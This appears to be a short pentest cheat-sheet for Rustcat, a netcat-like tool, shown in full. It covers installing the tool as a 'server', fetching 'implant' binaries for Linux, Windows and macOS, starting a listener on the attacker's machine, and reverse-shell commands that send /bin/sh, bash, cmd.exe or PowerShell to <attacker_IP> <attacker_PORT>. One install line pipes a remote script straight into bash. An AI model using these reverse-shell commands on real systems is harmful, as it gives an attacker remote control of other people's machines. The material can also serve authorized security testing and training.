# Rustcat

## Setup

### Server

Install it according to your distribution.

```
$ bash <(curl -s https://raw.githubusercontent.com/robiot/rustcat/master/pkg/debian-install.sh)
```

```
$ yay -S rustcat
```

```
$ cargo install rustcat
```

### Implant

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64
```

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-win-x86_64.exe
```

```
https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-aarch64

https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-x86_64
```

## Usage

Launch a listener on the attacker's machine in all addresses (`0.0.0.0`) with command history and command completion and `SIGINT` (`Ctrl + C`) blocking.

```
> rcat listen -ib <attacker_PORT>

> rcat l -ib <attacker_PORT>
```

### Reverse Shell

```
$ ./rcat c -s </bin/sh | /bin/bash> <attacker_IP> <attacker_PORT>
```

```
C:\> .\rcat.exe c -s <cmd.exe | powershell.exe> <attacker_IP> <attacker_PORT>
```

---
## References

### Github